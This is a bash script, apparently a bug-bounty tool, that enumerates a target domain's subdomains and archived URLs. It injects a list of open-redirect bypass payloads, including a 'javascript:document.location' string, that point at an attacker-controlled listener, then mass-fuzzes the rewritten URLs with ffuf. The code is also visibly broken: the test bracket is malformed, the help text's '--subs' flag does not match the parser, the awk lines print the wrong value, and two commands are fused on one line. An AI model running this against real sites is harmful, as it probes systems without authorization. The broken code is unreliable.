#!/bin/bash
printHelp() {
      echo -e "\e\n"
      echo -e " Usage: find_redirects.sh --target <target_domain> --listener <pingb_or_burp_collaborator> -
-subdomains <yes/no>\n"
      echo -e "\e[091m*************************************************************************************"
      echo -e "                                    Example:"
      echo -e "./find_redirects.sh --target mysite.com --listener http://pingb.in/p/abcde1234 --subs no"
      echo -e "\e[091m*************************************************************************************\e[0m\n"
      echo -e " --listener must be a well-formed url and include the uri."
      echo -e " --target must not include the uri\n"
      echo -e "If your redirect listener gets hit, check the file redirects_found.txt in this directory"
      echo -e "to see which request the redirect came from"
      echo -e "\n\n"
      echo -e "\e[091m*********************************************************************"
      echo -e "\e[091m Requires \e[036mffuf, amass, gau, and gf are installed \e[031m and in your PATH"
      echo -e "\e[091m*********************************************************************\e[0m\n\n"
}
target=''
listener=''
subs=''
#Check that --target --listener and --subs is set. If not print help.
while [ "$1" != "" ]; do
  case $1 in
    --target )
      shift
      target=$1
      ;;
    --listener )
      shift
      listener=$1
      ;;
    --subdomains )
      shift
      subs=$1
      ;;
    * )
printHelp

      exit 1
  esac
  shift
done
      

if [ -z "$target" ] || [ -z "$listener" || [ -z "$subs" ]; then
	printHelp
 	exit 1
fi
echo $target
echo $listener
echo $subs

#Clear old output.
rm output/*

#Subs = yes? Run amass
if [[ "$subs" = "no" ]]; then
	echo -e "\e[031m*********************************************************************"
	echo -e "\e[031mNot running amass Running gau against $target without subdomains"
	echo -e "\e[031m*********************************************************************\e[0m\n\n"
else
	echo -e "\e[031m*********************************************************************"
	echo -e "\e[031m               Running amass. Get some coffee."
	echo -e "\e[031m*********************************************************************\e[0m\n\n"


	amass enum -d $target
	amass db -names -d $target > output/amass_subs.txt
fi

#Time to get Creative Here!
#ByPass List
echo $listener >> output/pingb_bypass_list.txt
echo $listener | awk -F ":" '{ print $listener }' >> output/pingb_bypass_list.txt
echo $listener | awk -F "//" '{ print "\\\\"$listener }' >> output/pingb_bypass_list.txt
echo $listener | awk -F "//" '{ print "\\/"$listener }' >> output/pingb_bypass_list.txt
echo $listener | awk -F "//" '{ print "\\/\\/"$listener }' >> output/pingb_bypass_list.txt
echo $listener | awk -F "//" '{ print "/%09/"$listener }' >> output/pingb_bypass_list.txt
echo $listener | awk -F "//" '{ print "javascript:document.location=http://"$listener }' >> output/pingb_bypass_list.txt
echo $listener | awk -F "//" '{ print "///"$listener }' >> output/pingb_bypass_list.txt
echo $listener | awk -F "//" '{ print "////"$listener }' >> output/pingb_bypass_list.txt
echo $listener | awk -F "//" '{ print "/////\\"$listener }' >> output/pingb_bypass_list.txt
echo $listener | awk -F "//" '{ print "///"$listener }' >> output/pingb_bypass_list.txt

#Subs = no? Run gau without the -subs option. (Much faster)
if [[ "$subs" = "no" ]]; then
	gau $target | tee output/$target.gaulist.txt
	cat output/$target.gaulist.txt | gf redirect >> output/$target.redirects.found.txt
	for i in $( cat output/pingb_bypass_list.txt ); do cat output/$target.redirects.found.txt | qsreplace $i >> output/$target.replaced.txt;done
	ffuf  -u "FUZZ" -w output/$target.replaced.txt -r -v > output/ffuf_results.txt
	cat output/ffuf_results.txt | grep -A 3 "Size: 0, Words: 1, Lines: 1" | tee redirects_found.txt

#Subs = yes? Get coffee. Gau will be a while!
else
	cat output/amass_subs.txt | gau --subs | tee output/$target.gaulist.txt
	cat output/$target.gaulist.txt | gf redirect >> output/$target.redirects.found.txt
	for i in $( cat output/pingb_bypass_list.txt ); do cat output/$target.redirects.found.txt | qsreplace $i >> output/$target.replaced.txt;done
	ffuf  -u "FUZZ" -w output/$target.replaced.txt -r -v > output/ffuf_results.txtcat output/ffuf_results.txt | grep -A 3 "Size: 0, Words: 1, Lines: 1" | tee redirects_found.txt	

fi
#Check your pingb.in and corelate to redirects_found.txt


